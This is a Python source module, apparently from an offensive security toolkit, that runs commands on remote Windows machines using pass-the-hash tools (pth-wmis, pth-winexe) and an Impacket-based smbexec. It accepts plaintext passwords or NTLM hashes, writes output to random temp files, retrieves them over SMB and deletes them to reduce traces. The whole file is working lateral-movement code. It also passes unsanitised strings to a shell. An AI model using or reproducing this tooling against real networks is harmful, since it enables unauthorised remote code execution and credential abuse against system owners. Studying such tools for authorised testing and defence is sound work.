"""

Command and triggering related methods.
Also includes 2 exe-delivery methods.

Includes: 
    
    runCommand() - runs a command locally and returns the result
    wmisCommand() - executes a command on a target using pth-wmis
    winexeCommand() - executes a command on a target using pth-winexe
    wmisExecuteResult() - executes a command on a target using wmisCommand() and 
        returns the result file using ./lib/smb.py:getFile()
    winexeExecuteResult() - executes a command on a target using winexeCommand() and 
        returns the result file using ./lib/smb.py:getFile()
    executeResult() - wrapper for wmisExecuteResult()/winexeExecuteResult()
        this is one of the methods that most people should call!
    executeCommand() - wrapper for wmisCommand()/winexeCommand()
        this is the other method that most people should call!

"""

import subprocess, time, re

from lib import helpers
from lib import smb


def runCommand(cmd):
    """
    Run a system command locally and return the output.
    """
    
    # print "command: ",cmd
    p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)

    # the following is to deal with pth-winexe commands that 'hang'
    try:
        while not p.poll():
            time.sleep(1)
            # keep sending "enter" while this process hasn't finished
            p.stdin.write("\x0D")
        out = p.communicate(input="\x0D\r\n\x0D")[0]
    except:
        out = p.communicate(input="\x0D\r\n\x0D")[0]

    return out


def wmisCommand(target, username, password, cmd, outputFile=None):
    """
    Use wmis to execute a specific command on a target with the specified creds
    utilizes pth-wmis from passing-the-hash toolkit.

    If output for the command is wanted, supply an output file to "outputFile"

    Returns "success" on success and "failure" on failure.
    """

    # if we want the output of the command to be output to a file on the host
    if outputFile:
        # output result of command to C:\Windows\Temp\'output'
        wmisCMD = "pth-wmis -U '"+username+"%"+password+"' //"+target+" 'cmd.exe /C "+cmd+" > C:\\\\Windows\\\\Temp\\\\"+outputFile+"'"
    else:
        # just run the command
        wmisCMD = "pth-wmis -U '"+username+"%"+password+"' //"+target+" 'cmd.exe /C "+cmd+"'"

    # run the pth-wmis command on our system and get the output
    output = runCommand(wmisCMD)

    # if "Success" isn't in the command output, try to print the reason why
    if "Success" not in output:
        if "NT_STATUS_HOST_UNREACHABLE" in output or "NT_STATUS_NO_MEMORY" in output:
            print helpers.color(" [!] Host "+target+" unreachable", warning="True")
            return "error: host unreachable"
        elif "NT_STATUS_CONNECTION_REFUSED" in output:
            print helpers.color(" [!] Host "+target+" reachable but port not open", warning="True") 
            return "error: connection refused"
        elif "NT_STATUS_ACCESS_DENIED" in output or "NT_STATUS_LOGON_FAILURE" in output:
            print helpers.color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
            return "error: credentials failed"
        else:
            print helpers.color(" [!] Misc error on "+target, warning="True")
            return "error: misc failure"

    return "success"


def winexeCommand(target, username, password, cmd, outputFile=None):
    """
    Use pth-winexe to execute a specific command on a target with the specified creds.

    If you don't want to get the output of the command, i.e. for triggering a payload,
    pass 'output=False'

    Returns "success" on success and "failure" on failure.
    """
    
    # add in some string escapes into the passed command - needed?
    # cmd = cmd.replace("\\", "\\\\")
    
    # if we want the output of the command to be output to a file on the host
    if outputFile:
        # output result of command to C:\Windows\Temp\'outputFile'
        winexeCMD = "pth-winexe -U '"+username+"%"+password+"' --system --uninstall //"+target+" 'cmd.exe /C "+cmd+" > C:\\\\Windows\\\\Temp\\\\"+outputFile+"'"
    else:
        # just run the command
        winexeCMD = "pth-winexe -U '"+username+"%"+password+"' --system --uninstall //"+target+" 'cmd.exe /C "+cmd+"'"

    # run the pth-winexe command on our system and get the output
    output = runCommand(winexeCMD)

    # error checking
    if "NT_STATUS_HOST_UNREACHABLE" in output or "NT_STATUS_NO_MEMORY" in output:
        print helpers.color(" [!] Host "+target+" unreachable", warning="True")
        return "error: host unreachable"
    elif "NT_STATUS_CONNECTION_REFUSED" in output:
        print helpers.color(" [!] Host "+target+" reachable but port not open", warning="True")
        return "error: connection refused"
    elif "NT_STATUS_ACCESS_DENIED" in output or "NT_STATUS_LOGON_FAILURE" in output:
        print helpers.color(" [!] Credentials " + username + ":" + password + " failed on "+target, warning="True")
        return "error: credentials failed"
    
    return "success"


def smbexecCommand(target, username, password, cmd, outputFile=None):
    """
    Calls a modified version of Impacket's smbexec.py example
    and returns the output of the command passed.
        code hosted in ./lib/smb.py

    Creates a service but doesn't drop any binary to disk.

    """

    # see if we need to extract a domain from "domain\username"
    domain = ""
    if "/" in username:
        domain,username = username.split("/")

    # check if we have a LM:NTLM credential passed
    if re.match(r'[0-9A-Za-z]{32}:[0-9A-Za-z]{32}', password):
        s = smb.CMDEXEC("445/SMB", username, "", domain, password, "SHARE", "C$", outputFile=outputFile)
    else:
        s = smb.CMDEXEC("445/SMB", username, password, domain, None, "SHARE", "C$", outputFile=outputFile)
    try:
        s.run(target, cmd)
        return "success"
    except:
        return "error: misc error in smbexec execution"


def wmisExecuteResult(target, username, password, cmd, pause=2):
    """
    Run a particular command with wmisCommand(), get the result
    with getFile() and delete the temporary output file.

    'pause' is the number of seconds between execution of the command
    and the grabbing of the temporary file, defaults to 2 seconds

    Returns the result of the command on success, and "failure" on failure.
    """

    # choose a random output file
    outputFile = helpers.randomString() + ".txt"

    # execute the wmisCommand and specify the output file to be our randomized name
    output = wmisCommand(target, username, password, cmd, outputFile=outputFile)

    # check if the command was successful
    if output == "success":

        # sleep for a bit of time before we grab the output file
        time.sleep(pause)
        
        # retrieve the output file and delete it
        return smb.getFile(target, username, password, "C:\\Windows\\Temp\\"+outputFile, delete=True)

    return output


def winexeExecuteResult(target, username, password, cmd, pause=1):
    """
    Run a particular command with winexeCommand(), get the result
    with getFile() and delete the temporary output file.

    'pause' is the number of seconds between execution of the command
    and the grabbing of the temporary file, defaults to 1 second

    Returns the result of the command on success, and "failure" on failure.
    """

    # choose a random output file
    outputFile = helpers.randomString() + ".txt"

    # execute the wmisCommand and specify the output file to be our randomized name
    output = winexeCommand(target, username, password, cmd, outputFile=outputFile)

    # check if the command was successful
    if output == "success":

        # sleep for a bit of time before we grab the output file
        time.sleep(pause)
        
        # retrieve the output file and delete it
        return smb.getFile(target, username, password, "C:\\Windows\\Temp\\"+outputFile, delete=True)

    return output


def smbexecExecuteResult(target, username, password, cmd, pause=1):
    """
    Calls a modified version of Impacket's smbexec.py example
    and returns the output of the command passed.
        code hosted in ./lib/smb.py

    Creates a service but doesn't drop any binary to disk.
    """

    # choose a random output file
    outputFile = helpers.randomString() + ".txt"

    # run the command
    smbexecCommand(target, username, password, cmd, outputFile=outputFile)

    # sleep for a bit of time before we grab the output file
    time.sleep(pause)
    
    # return the output
    return smb.getFile(target, username, password, "C:\\Windows\\Temp\\"+outputFile, delete=True)


def executeResult(target, username, password, cmd, triggerMethod="wmis", pause=1):
    """
    This is one of the main command interface method everyone should use!

    Wrapper to call wmisExecuteResult() or winexeExecuteResult() 
    depending on the trigger method passed, defaulting to 'wmis'.

    'pause' is the number of seconds between execution of the command
    and the grabbing of the temporary file, defaults to 1 second

    Returns the result of the command on success, and "failure" on failure.
    """

    if triggerMethod.lower() == "wmis":
        return wmisExecuteResult(target, username, password, cmd, pause)
    elif triggerMethod.lower() == "winexe":
        return winexeExecuteResult(target, username, password, cmd, pause)
    elif triggerMethod.lower() == "smbexec":
        return smbexecExecuteResult(target, username, password, cmd)
    else:
        print helpers.color(" [!] Error: please specify wmis, winexe, or smbexec for a trigger method", warning=True)
        return "failure"


def executeCommand(target, username, password, cmd, triggerMethod="wmis"):
    """
    This is one of the main command interface method everyone should use!

    Wrapper to call wmisCommand() or winexeCommand()
    depending on the trigger method passed, defaulting to 'wmis'.

    Returns "sucess" on success, and "failure" on failure.
    """

    if triggerMethod.lower() == "wmis":
        return wmisCommand(target, username, password, cmd)
    elif triggerMethod.lower() == "winexe":
        return winexeCommand(target, username, password, cmd)
    elif triggerMethod.lower() == "smbexec":
        return smbexecCommand(target, username, password, cmd)
    else:
        print "method:",triggerMethod
        print helpers.color(" [!] Error: please specify wmis, winexe, or smbexec for a trigger method", warning=True)
        return "failure"

